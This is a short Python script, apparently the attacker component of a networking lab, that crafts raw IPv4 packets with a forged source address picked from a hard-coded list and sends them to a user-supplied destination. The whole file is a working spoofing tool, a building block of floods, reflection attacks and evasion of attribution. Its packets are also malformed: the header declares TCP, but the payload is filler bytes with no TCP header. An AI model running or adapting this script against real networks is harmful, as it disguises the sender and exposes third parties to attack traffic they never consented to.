# attacker/spoofed_packet_sender.py
import socket
import struct
import random

def create_ip_header(source_ip, dest_ip):
    """Create a basic IP header with spoofed source IP"""
    # IP header fields
    ip_ihl = 5
    ip_ver = 4
    ip_tos = 0
    ip_tot_len = 20  # IP header length
    ip_id = random.randint(1, 65535)  # ID of this packet
    ip_frag_off = 0
    ip_ttl = 255
    ip_proto = socket.IPPROTO_TCP
    ip_check = 0  # Will be filled by kernel
    ip_saddr = socket.inet_aton(source_ip)  # Spoof the source IP address
    ip_daddr = socket.inet_aton(dest_ip)
    
    ip_ihl_ver = (ip_ver << 4) + ip_ihl
    
    # The ! in the pack format string means network byte order
    ip_header = struct.pack('!BBHHHBBH4s4s',
        ip_ihl_ver,
        ip_tos,
        ip_tot_len,
        ip_id,
        ip_frag_off,
        ip_ttl,
        ip_proto,
        ip_check,
        ip_saddr,
        ip_daddr
    )
    
    return ip_header

def send_spoofed_packet():
    """Send a packet with a spoofed source IP address"""
    # create a raw socket
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    except socket.error as e:
        print(f"Socket creation error: {e}")
        print("Note: This script requires root/administrator privileges")
        return
    
    # get target details
    dest_ip = input("Enter destination IP: ")
    
    # fake source IP
    fake_ips = [
        "0.0.0.1",       
        "255.255.255.1", 
        "10.0.0.1",      
        "192.168.1.1",    
        "206.162.192.131",
        "34.225.57.60",
        "241.186.103.59",
        "96.81.115.2",
        "183.163.223.152",
        "119.138.237.87",
        "22.233.164.116",
        "154.94.118.108",
        "93.238.241.116",
        "215.214.209.123"
    ]
    
    source_ip = random.choice(fake_ips)
    print(f"[+] Using spoofed source IP: {source_ip}")
    
    # Create IP header
    ip_header = create_ip_header(source_ip, dest_ip)
    
    # Create a simple payload
    payload = b'X' * 20
    
    # Send the packet
    packet = ip_header + payload
    
    try:
        s.sendto(packet, (dest_ip, 0))
        print("[+] Spoofed packet sent successfully")
    except Exception as e:
        print(f"[!] Error sending packet: {e}")
    finally:
        s.close()

if __name__ == "__main__":
    send_spoofed_packet()